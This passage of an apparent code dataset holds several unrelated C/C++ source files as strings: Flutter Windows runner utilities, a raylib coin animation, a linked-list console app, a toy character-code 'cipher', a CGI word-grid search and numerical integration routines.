connection is1 -> 3  with charge : 200\r\nMinimum cost connection is3 -> 4  with charge : 450\r\nThe minimum total cost of connections of all branches is: 800\r\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"Header_files/coins.hpp\"\n\n\nCOIN::COIN()\n{\n    //Every coin status wheather it is collected or not\n    for (int i = 0; i < 49; ++i)\n    {\n        coinCollected[i] = false;\n    }\n    \n    //Loading coin Image\n    Coin_image = LoadImageAnim(\"Pictures/coin.gif\", &animFrames);\n\n    //Loading image to texture for display\n    for (int i = 0; i < 50; i++)\n        Coin_Texture[i] = LoadTextureFromImage(Coin_image);\n\n    //Initializing the position of coins\n    coins_positions[0].x = 150;\n    coins_positions[0].y = 880;\n\n    coins_positions[1].x = 300;\n    coins_positions[1].y = 800;\n\n    coins_positions[2].x = 400;\n    coins_positions[2].y = 890;\n\n    coins_positions[3].x = 550;\n    coins_positions[3].y = 800;\n\n    //coins on the enemy plates\n    coins_positions[4].x = 640;\n    coins_positions[4].y = 890;\n\n    coins_positions[5].x = 550;\n    coins_positions[5].y = 920;\n\n    //Coins after first enemy plate\n\n    coins_positions[6].x = 600;\n    coins_positions[6].y = 800;\n\n    coins_positions[7].x = 900;\n    coins_positions[7].y = 800;\n\n    coins_positions[8].x = 1040;\n    coins_positions[8].y = 800;\n\n    coins_positions[9].x = 1000;\n    coins_positions[9].y = 750;\n\n    coins_positions[10].x = 1050;\n    coins_positions[10].y = 650;\n\n    coins_positions[11].x = 900;\n    coins_positions[11].y = 500;\n\n    coins_positions[12].x = 700;\n    coins_positions[12].y = 500;\n\n    coins_positions[13].x = 500;\n    coins_positions[13].y = 600;\n\n    coins_positions[14].x = 700;\n    coins_positions[14].y = 700;\n\n    coins_positions[15].x = 650;\n    coins_positions[15].y = 650;\n\n    coins_positions[16].x = 450;\n    coins_positions[16].y = 580;\n\n    coins_positions[17].x = 350;\n    coins_positions[17].y = 580;\n\n    coins_positions[18].x = 250;\n    coins_positions[18].y = 580;\n\n    coins_positions[19].x = 150;\n    coins_positions[19].y = 580;\n\n    coins_positions[20].x = 50;\n    coins_positions[20].y = 400;\n\n    coins_positions[21].x = 70;\n    coins_positions[21].y = 300;\n\n    coins_positions[22].x = 90;\n    coins_positions[22].y = 200;\n\n    coins_positions[23].x = 150;\n    coins_positions[23].y = 100;\n\n    coins_positions[24].x = 250;\n    coins_positions[24].y = 120;\n\n    coins_positions[25].x = 350;\n    coins_positions[25].y = 120;\n\n    coins_positions[26].x = 450;\n    coins_positions[26].y = 180;\n\n    coins_positions[27].x = 570;\n    coins_positions[27].y = 300;\n\n    coins_positions[28].x = 670;\n    coins_positions[28].y = 250;\n\n    coins_positions[29].x = 770;\n    coins_positions[29].y = 150;\n\n    coins_positions[30].x = 850;\n    coins_positions[30].y = 220;\n\n    coins_positions[31].x = 950;\n    coins_positions[31].y = 120;\n\n    coins_positions[32].x = 1050;\n    coins_positions[32].y = 120;\n\n    coins_positions[33].x = 1250;\n    coins_positions[33].y = 220;\n\n    coins_positions[34].x = 1450;\n    coins_positions[34].y = 320;\n\n    coins_positions[35].x = 1650;\n    coins_positions[35].y = 350;\n\n    coins_positions[36].x = 1750;\n    coins_positions[36].y = 550;\n\n    coins_positions[37].x = 1850;\n    coins_positions[37].y = 550;\n\n    coins_positions[38].x = 1950;\n    coins_positions[38].y = 550;\n\n    coins_positions[39].x = 1550;\n    coins_positions[39].y = 550;\n\n    coins_positions[40].x = 1650;\n    coins_positions[40].y = 550;\n\n    coins_positions[41].x = 1300;\n    coins_positions[41].y = 480;\n\n    coins_positions[42].x = 1400;\n    coins_positions[42].y = 480;\n\n    coins_positions[43].x = 1650;\n    coins_positions[43].y = 880;\n\n    coins_positions[44].x = 1750;\n    coins_positions[44].y = 880;\n\n    coins_positions[45].x = 1850;\n    coins_positions[45].y = 880;\n\n    coins_positions[46].x = 1550;\n    coins_positions[46].y = 880;\n\n    nextFrameDataOffset = 0;\n    currentAnimFrame = 0;\n    frameDelay = 50;\n    frameCounter = 0;\n\n    //Making rectangle for each coin\n    for (int i = 0; i < 49; i++)\n    {\n        Coin_Rect[i] = { coins_positions[i].x,coins_positions[i].y,(float)Coin_image.width,(float)Coin_image.height };\n    }\n\n}\n\nCOIN::~COIN()\n{\n    //Unloading each taxture and image of coin to free the memory space\n    for (int i = 0; i < 49; i++)\n    {\n        UnloadTexture(Coin_Texture[i]);\n\n    }\n    UnloadImage(Coin_image);\n\n}\n\n//Drawing coins\nvoid COIN::Draw()\n{\n    //Coin will draw only if it is not collected\n    for (int i = 0; i < 49; ++i)\n    {\n        // Draw only if the coin has not been collected\n        if (!coinCollected[i]) {\n            DrawTextureV(Coin_Texture[i], coins_positions[i], GOLD);\n        }\n    }\n\n}\n\n//Use to update the frames of coins to look like rotating coin\nvoid COIN::Update()\n{\n    frameCounter++;\n    if (frameCounter >= frameDelay)\n    {\n        // Move to next frame\n        //If final frame is reached we return to first frame\n        currentAnimFrame++;\n        if (currentAnimFrame >= animFrames) currentAnimFrame = 0;\n\n\n        nextFrameDataOffset = Coin_image.width * Coin_image.height * 4 * currentAnimFrame;\n\n\n\n        for (int i = 0; i < 49; i++)\n        {\n            if (!coinCollected[i])\n   ",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <iostream>\nusing namespace std;\nstruct node\n{\n\tint data;\n\tnode* next;\n};\n\nnode* head = NULL;\nnode* current = NULL;\nnode* tail = NULL;\n\nvoid insert(int newdata)\n{\n\tcurrent = new node;\n\tcurrent->data = newdata;\n\tcurrent->next = NULL;\n\n\tif (head == NULL)\n\t{\n\t\thead = current;\n\t\ttail = current;\n\t}\n\telse\n\t{\n\t\ttail->next = current;\n\t\ttail = tail->next;\n\t}\n}\nvoid AddToHead(int newdata)\n{\n\tcurrent = new node;\n\tcurrent->data = newdata;\n\tcurrent->next = NULL;\n\tif (head == NULL)\n\t{\n\t\thead = current;\n\t\ttail = current;\n\t}\n\telse\n\t{\n\t\tcurrent->next = head;\n\t\thead = current;\n\t}\n}\nvoid deleteNode(int Deldata) {\n\tif (head != NULL)\n\t{\n\t\tcurrent = head;\n\t\tif (current->data == Deldata)\n\t\t{\n\t\t\thead = head->next;\n\t\t\tdelete current;\n\t\t}\n\t\telse\n\t\t{\n\t\t\twhile (current != NULL)\n\t\t\t{\n\t\t\t\tif ((current->next)->data == Deldata)\n\t\t\t\t{\n\t\t\t\t\t(current->next) = (current->next)->next;\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t\telse { current = current->next; }\n\t\t\t}\n\t\t}\n\t}\n\telse { cout << \"No Data Found\" << endl; }\n}\nvoid destoryList()\n{\n\tif (head != NULL)\n\t{\n\t\tcurrent = head;\n\t\twhile (current != NULL)\n\t\t{\n\t\t\thead = head->next;\n\t\t\tdelete current;\n\t\t\tcurrent = head;\n\t\t}\n\t\thead = NULL;\n\t\ttail = NULL;\n\t\tcout << \"The list is Destroyed Successfully\" << endl;\n\t}\n\telse\n\t{ cout << \"There is no list to be destroyed\" << endl; }\n}\nvoid display()\n{\n\tif (head != NULL)\n\t{\n\t\tcurrent = head;\n\t\tcout << \"Data:\" << endl;\n\t\twhile (current != NULL)\n\t\t{\n\t\t\tcout << current->data << endl;\n\t\t\tcurrent = current->next;\n\t\t}\n\t}\n\telse\n\t{ cout << \"No Data Found\" << endl; }\n}\n\nvoid app() {\n\t/*\n\t\top -> operation\n\t\tath -> add to head\n\t\tdn -> deleted node\n\t\tc -> confirm\n\t\tao -> another operation\n\t\ts -> starter app\n\t*/\n\tint op, ath, dn, c, ao, s;\n\n\tcout << \"--- Welcome to linked list implementation---\\n\";\n\tdo {\n\t\tcout << \"Choise what do you want\\n\";\n\t\tcout << \"Add to head -> (1)\\n\";\n\t\tcout << \"Delete node -> (2)\\n\";\n\t\tcout << \"Display -> (3)\\n\";\n\t\tcout << \"Destory list -> (4)\\n\";\n\t\tcout << \"Exit -> (5)\\n\";\n\t\tcin >> op;\n\t\tif (op == 1) {\n\t\t\tcout << \"Enter value do you want to add to head\\n\";\n\t\t\tcin >> ath;\n\t\t\tAddToHead(ath);\n\t\t\tdisplay();\n\t\t}\n\t\telse if (op == 2) {\n\t\t\tdisplay();\n\t\t\tcout << \"Choise the node \\n\";\n\t\t\tcin >> dn;\n\t\t\tcout << \"Are you sure to delete this node\\n\";\n\t\t\tcout << \"To Confirm Enter -> (1)\\n\";\n\t\t\tcout << \"To Cancel Enter -> any key\\n\";\n\t\t\tcin >> c;\n\t\t\tif (c == 1)\n\t\t\t{\n\t\t\t\tdeleteNode(dn);\n\t\t\t\tcout << \"\\nCheck data of list after deleting node : \\n \";\n\t\t\t\tdisplay();\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tcout << \"Delete is canceled\\n\";\n\t\t\t}\n\t\t}\n\t\telse if (op == 3) {\n\t\t\tcout << \"\\nThe Nodes of the Linked List are: \\n\";\n\t\t\tdisplay();\n\t\t}\n\t\telse if (op == 4) {\n\t\t\tdisplay();\n\t\t\tcout << \"\\nIF Destroyed the whole list\\n \\t The result will be: \\n\";\n\t\t\tcout << \"Are you sure to destroy the whole list\\n\";\n\t\t\tcout << \"To Confirm Enter -> (1)\\n\";\n\t\t\tcout << \"To Cancel Enter -> any key\\n\";\n\t\t\tcin >> c;\n\t\t\tif (c == 1)\n\t\t\t{\n\t\t\t\tdestoryList();\n\t\t\t\tcout << \"\\nCheck data of list after destroying : \\n \";\n\t\t\t\tdisplay();\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tcout << \"Destroy is canceled\\n\";\n\t\t\t}\n\t\t}\n\t\telse if (op == 5)\n\t\t{\n\t\t\treturn;\n\t\t}\n\t\telse { cout << \"Error in entry\\n\"; }\n\n\t\tcout << \"\\n\";\n\n\t\tcout << \"Do you want another opration\\n\";\n\t\tcout << \"Yes -> 1 \\n\";\n\t\tcout << \"NO -> any key \\n\";\n\t\tcin >> ao;\n\n\t} while (ao == 1);\n}\nint main()\n{\n\tapp();\n\treturn 0;\n}",
    "\ufeff#include \"chiper.h\"\n\nconst auto chiperMessage = []() -> void {\n\tsystem( \"cls\" );\n\n\tstd::string* enteredMessage = new std::string( \"\" );\n\tstd::string* chiperedMessage = new std::string( \"\" );\n\n\tstd::cout << \"Enter your message: \";\n\tgetline( std::cin, *enteredMessage );\n\n\tconst std::size_t* const enteredMessageSize = new std::size_t( enteredMessage->length() );\n\n\tfor (std::size_t i = 0; i < *enteredMessageSize; i++) {\n\t\tint* symbol = new int( (*enteredMessage)[i] );\n\n\t\t*chiperedMessage += std::to_string( *symbol );\n\n\t\tif (!(i == *enteredMessageSize - 1)) chiperedMessage->push_back( '_' );\n\n\t\tdelete symbol;\n\t}\n\n\tdelete enteredMessageSize;\n\n\tstd::cout << \"Chipered message: \" << *chiperedMessage << std::endl;\n\n\tdelete enteredMessage;\n\tdelete chiperedMessage;\n\n\t_getch();\n};\n\nconst auto unchiperMessage = []() -> void {\n\tsystem( \"cls\" );\n\n\tstd::string* chiperedMessage = new std::string( \"\" );\n\tstd::string* unchiperedMessage = new std::string( \"\" );\n\n\tstd::cout << \"IF YOU DON'T KNOW A CHIPER IT WILL BE A ERROR!!!\" << std::endl;\n\tstd::cout << \"Enter your chipered message: \";\n\tgetline( std::cin, *chiperedMessage );\n\n\tstd::string* delimiter = new std::string(\"_\");\n\tstd::size_t* pos = new std::size_t(0);\n\n\tstd::string* token = new std::string(\"\");\n\n\tstd::vector<std::string>* symbols = new std::vector<std::string>({});\n\n\twhile ((*pos = chiperedMessage->find( *delimiter )) != std::string::npos) {\n\t\t*token = chiperedMessage->substr( 0, *pos );\n\n\t\tsymbols->push_back( *token );\n\n\t\tchiperedMessage->erase( 0, *pos + delimiter->length() );\n\t}\n\n\tsymbols->push_back( *chiperedMessage );\n\n\tdelete delimiter;\n\tdelete pos;\n\tdelete token;\n\n\tfor (std::size_t i = 0; i < symbols->size(); i++) {\n\t\tunchiperedMessage->push_back(static_cast<char>(std::stoi((*symbols)[i])));\n\t}\n\n\tdelete symbols;\n\n\tstd::cout << \"Unchipered message: \" << *unchiperedMessage << std::endl;\n\n\tdelete chiperedMessage;\n\tdelete unchiperedMessage;\n\n\t_getch();\n};\n\n\nint main() {\n\t\n\tstd::cout << \"[c]hiper or [u]nchiper message: \";\n\tint* command = new int(_getch());\n\t\n\tif (static_cast<char>(*command) == 'c') chiperMessage(); \n\tif (static_cast<char>(*command) == 'u') unchiperMessage();\n\tif (!(static_cast<char>(*command) == 'c') && !(static_cast<char>(*command) == 'u')) exit( 505 );\n\n\tdelete command;\n\t\n\treturn 0;\n}\n",
    "#include <iostream>\n#include <cstdlib>\n#include <string>\n#include <vector>\n#include <algorithm>\n#include <sstream>\n#include <ctime> // For randomization\n#include <cgicc/Cgicc.h>\n#include <cgicc/HTTPHTMLHeader.h>\n#include <cgicc/FormEntry.h>\n#include <cgicc/HTTPStatusHeader.h>\n\nusing namespace cgicc;\nstd::string trim(const std::string& str) {\n    size_t start = str.find_first_not_of(\" \\t\\n\\r\");\n    size_t end = str.find_last_not_of(\" \\t\\n\\r\");\n    return (start == std::string::npos || end == std::string::npos) ? \"\" : str.substr(start, end - start + 1);\n}\n\nstd::vector<std::string> generateRandomGrid(int rows, int cols) {\n    std::vector<std::string> grid(rows);\n    std::srand(std::time(0)); // Seed for random generation\n\n    for (int i = 0; i < rows; ++i) {\n        std::string row;\n        for (int j = 0; j < cols; ++j) {\n            char randomLetter = 'A' + (std::rand() % 26); // Random letter from A-Z\n            row += randomLetter;\n        }\n        grid[i] = row;\n    }\n\n    return grid;\n}\n\nint countWordInGrid(const std::vector<std::string>& grid, const std::string& word) {\n    int count = 0;\n    std::string upperWord = word;\n    std::transform(upperWord.begin(), upperWord.end(), upperWord.begin(), ::toupper);\n\n    for (const auto& row : grid) {\n        std::string upperRow = row;\n        std::transform(upperRow.begin(), upperRow.end(), upperRow.begin(), ::toupper);\n        for (size_t i = 0; i <= upperRow.length() - upperWord.length(); i++) {\n            if (upperRow.substr(i, upperWord.length()) == upperWord) {\n                count++;\n            }\n        }\n    }\n\n    for (size_t col = 0; col < grid[0].length(); col++) {\n        for (size_t row = 0; row <= grid.size() - upperWord.length(); row++) {\n            std::string verticalSegment;\n            for (size_t k = 0; k < upperWord.length(); k++) {\n                verticalSegment += grid[row + k][col];\n            }\n            std::transform(verticalSegment.begin(), verticalSegment.end(), verticalSegment.begin(), ::toupper);\n            if (verticalSegment == upperWord) {\n                count++;\n            }\n        }\n    }\n\n    return count;\n}\n\nint main() {\n    try {\n        Cgicc cgi;\n        std::cout << HTTPHTMLHeader() << std::endl;\n\n        std::string gridType = cgi(\"gridType\");\n        std::string searchWord = trim(cgi(\"searchWord\"));\n\n        std::vector<std::string> grid;\n\n        if (gridType == \"generate\") {\n            int rows = std::stoi(cgi(\"rows\"));\n            int cols = std::stoi(cgi(\"columns\"));\n\n            grid = generateRandomGrid(rows, cols);\n        } else {\n            const_file_iterator file = cgi.getFile(\"gridFile\");\n            if (file != cgi.getFiles().end()) {\n                std::istringstream stream((*file).getData());\n                std::string line;\n                while (std::getline(stream, line)) {\n                    if (!line.empty()) {\n                        grid.push_back(line);\n                    }\n                }\n            }\n        }\n\n        int wordCount = countWordInGrid(grid, searchWord);\n\n        std::cout << \"<html lang=\\\"en\\\">\\n\";\n        std::cout << \"<head>\\n\";\n        std::cout << \"<title>Pattern Match Game Result</title>\\n\";\n        std::cout << \"<style>\\n\";\n        std::cout << \"body { font-family: Arial, sans-serif; background: #f5f5f5; color: #333; text-align: center; }\\n\";\n        std::cout << \".container { max-width: 600px; margin: 20px auto; padding: 20px; background-color white; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2); }\\n\";\n        std::cout << \".content { padding: 20px; text-align: center; }\\n\";\n        std::cout << \"pre { background: #f0f0f0; border: 1px solid #ddd; padding: 10px; border-radius: 5px; font-size: 1.25em; }\\n\"; \n        std::cout << \"</style>\\n\";\n        std::cout << \"</head>\\n\";\n        std::cout << \"<body>\\n\";\n        std::cout << \"<div class='container'>\\n\";\n        std::cout << \"<h1>Pattern Match Game Result</h1>\\n\";\n        std::cout << \"<div class='content'>\\n\";\n        std::cout << \"<pre>\\n\";\n        for (const auto& row : grid) {\n            std::cout << row << \"\\n\";\n        }\n        std::cout << \"</pre>\\n\";\n        std::cout << \"<p>Occurrences of the word '\" << searchWord << \"': \" << wordCount << \"</p>\\n\";\n        std::cout << \"</div>\\n\";\n        std::cout << \"</div>\\n\";\n        std::cout << \"</body>\\n\";\n        std::cout << \"</html>\\n\";\n    } catch (const std::exception& e) {\n        std::cout << \"Content-Type: text/plain\\n\\n\";\n        std::cout << \"Error: \" << e.what() << std::endl;\n    }\n\n    return 0;\n}\n\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include <iostream>\n#include <iomanip>\n#include <cmath>\n\n// Midpoint method\nvoid midpoint(double a, double b, int iterations, double (*func)(double)) {\n    double prev_integral = 0.0; \n    double prev_prev_integral = 0.0; \n\n    std::cout << \"MidPoint result:\" << std::endl;\n    std::cout   << std::setw(2)     << \"i\" \n                << std::setw(15)    << \"A(h_i)\" \n                << std::setw(20)    << \"A(h_(i-1))-A(h_i)\" \n                << std::setw(15)    << \"alp^k\" \n                << std::setw(15)    << \"Rich-error\" \n                << std::setw(15)    << \"f-calc\" \n                << std::endl;\n\n    for (int i = 0; i <= iterations; i++) {\n        double n = pow(2, i);\n        double h = (b - a) / n;\n        double sum = 0.0;\n        for (int j = 0; j < n; j++) {\n            double x_mid = a + (j + 0.5) * h; \n            sum += func(x_mid); \n        }\n        double integral = h * sum; \n        std::cout << std::setw(2) << i+1 << std::setw(15) << integral; \n\n        if (i > 0) {\n            double diff = prev_integral - integral; \n            std::cout << std::setw(20) << diff;\n            if (i > 1) {\n                double diff1 = prev_prev_integral - prev_integral; \n                double alpha_k = diff1 / diff;           \n                double richardson = (diff) / (alpha_k - 1.0); \n                std::cout << std::setw(15) << alpha_k; \n                std::cout << std::setw(15) << richardson; \n                std::cout << std::setw(15) << n;  \n            }\n        }\n        \n        std::cout << std::endl;\n        prev_prev_integral = prev_integral;\n        prev_integral = integral;\n    }\n}\n\n// Trapezoidal method\nvoid trapezoidal(double a, double b, int iterations, double (*func)(double)) {\n    double prev_integral = 0.0; \n    double prev_prev_integral = 0.0; \n    \n    std::cout << \"Trapezoidal result:\" << std::endl;\n    std::cout   << std::setw(2)     << \"i\" \n                << std::setw(15)    << \"A(h_i)\" \n                << std::setw(20)    << \"A(h_(i-1))-A(h_i)\" \n                << std::setw(15)    << \"alp^k\" \n                << std::setw(15)    << \"Rich-error\" \n                << std::setw(15)    << \"f-calc\" \n                << std::endl;\n    \n    for (int i = 0; i <= iterations; i++) {\n        double n = pow(2, i);\n        double h = (b - a) / n;\n        double sum = 0.0;\n        for (int j = 1; j < n; j++) {\n            double x = a + j * h;\n            sum += func(x);\n        }\n        double integral = h * (0.5 * (func(a) + func(b)) + sum); \n        std::cout << std::setw(2) << i+1 << std::setw(15) << integral;\n        \n        if (i > 0) {\n            double diff = prev_integral - integral;\n            std::cout << std::setw(20) << diff;\n            if (i > 1) {\n                double diff1 = prev_prev_integral - prev_integral; \n                double alpha_k = diff1 / diff;           \n                double richardson = (diff) / (alpha_k - 1.0); \n                std::cout << std::setw(15) << alpha_k; \n                std::cout << std::setw(15) << richardson; \n                std::cout << std::setw(15) << n + 1;  \n            }\n        }\n        \n        std::cout << std::endl;\n        prev_prev_integral = prev_integral;\n        prev_integral = integral;\n    }\n}\n\n// Simpson's method\nvoid simpsons(double a, double b, int iterations, double (*func)(double)) {\n    double prev_integral = 0.0; \n    double prev_prev_integral = 0.0; \n    \n    std::cout << \"Simpson's result:\" << std::endl;\n    std::cout   << std::setw(2)     << \"i\" \n                << std::setw(15)    << \"A(h_i)\" \n                << std::setw(20)    << \"A(h_(i-1))-A(h_i)\" \n                << std::setw(15)    << \"alp^k\" \n                << std::setw(15)    << \"Rich-error\" \n                << std::setw(15)    << \"f-calc\" \n                << std::endl;\n    \n    for (int i = 0; i <= iterations; i++) {\n        double n = pow(2, i);\n        double h = (b - a) / n;\n        double sum_even = 0.0;\n        double sum_odd = 0.0;\n        for (int j = 1; j < n; j++) {\n            double x = a + j * h;\n            if (j % 2 == 0) {\n                sum_even += func(x);\n            } else {\n                sum_odd += func(x);\n            }\n        }\n        double integral = (h / 3.0) * (func(a) + func(b) + 4.0 * sum_odd + 2.0 * sum_even);\n        std::cout << std::setw(2) << i+1 << std::setw(15) << integral;\n        \n        if (i > 0) {\n            double diff = prev_integral - integral;\n            std::cout << std::setw(20) << diff;\n            if (i > 1) {\n                double diff1 = prev_prev_integral - prev_integral; \n                double alpha_k = diff1 / diff;           \n                double richardson = (diff) / (alpha_k - 1.0); \n                std::cout << std::setw(15) << alpha_k; \n                std::cout << std::setw(15) << richardson; \n                std::cout << std::setw(15) << n + 1;  \n            }\n        }\n        \n        std::cout << std::endl;\n        prev_prev_integral = prev_integral;\n        prev_integral ",
